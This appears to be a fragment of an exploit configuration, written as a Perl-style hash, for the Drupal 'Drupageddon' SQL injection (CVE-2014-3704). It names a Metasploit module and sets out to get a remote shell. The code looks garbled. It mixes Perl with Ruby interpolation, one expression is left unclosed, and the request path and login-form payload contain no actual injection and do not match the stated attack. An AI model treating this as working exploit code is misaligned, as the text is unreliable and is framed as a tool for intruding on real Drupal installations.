my $EXPLOIT = {
  "#{USER}"     => "#{generate_password_hash(pass)",
  "CVE"         => "CVE-2014-3704",
  "DESCRIPTION" => "

        This module exploits the Drupal HTTP Parameter Key/Value SQL Injection

        (aka Drupageddon) in order to achieve a remote shell on the vulnerable

        instance. This module was tested against Drupal 7.0 and 7.31 (was fixed

        in 7.32).

      ",
  "METHOD"      => "GET",
  "MSF_MODULE"  => "drupal_drupageddon",
  "PATH"        => "q=user/login&q=user/login&q=user/login&q=admin/modules&q=admin/modules/list/confirm&q=admin/people/permissions&q=admin/people/permissions&q=node/add/article&",
  "PAYLOAD"     => "name=__NAME__&pass=__PASS__&form_build_id=__FORM_BUILD_ID__&form_id=user_login&op=Login&",
  "REFERENCES"  => [
                     "https://www.drupal.org/SA-CORE-2014-005",
                     "http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html",
                   ],
  "TITLE"       => "Drupal HTTP Parameter Key/Value SQL Injection",
  VARIABLES => {
    'FORM_BUILD_ID' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PASS' =>       { DESCRIPTION => "", VALUE => "" },
  },
